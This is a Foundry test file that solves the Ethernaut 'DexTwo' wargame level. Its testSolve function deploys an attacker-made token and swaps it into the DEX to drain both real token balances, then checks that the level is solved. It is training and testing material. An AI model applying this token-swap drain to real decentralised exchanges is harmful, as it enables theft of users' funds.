// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DexTwo, SwappableTokenTwo} from "src/levels/DexTwo.sol";
import {DexTwoFactory} from "src/levels/DexTwoFactory.sol";
import {DexTwoAttackToken} from "src/attacks/DexTwoAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestDexTwo is Test, Utils {
    Ethernaut ethernaut;
    DexTwo instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = DexTwo(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        SwappableTokenTwo token1 = SwappableTokenTwo(instance.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(instance.token2());

        DexTwoAttackToken attack = new DexTwoAttackToken();
        instance.swap(address(attack), address(token1), 1);
        instance.swap(address(attack), address(token2), 1);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
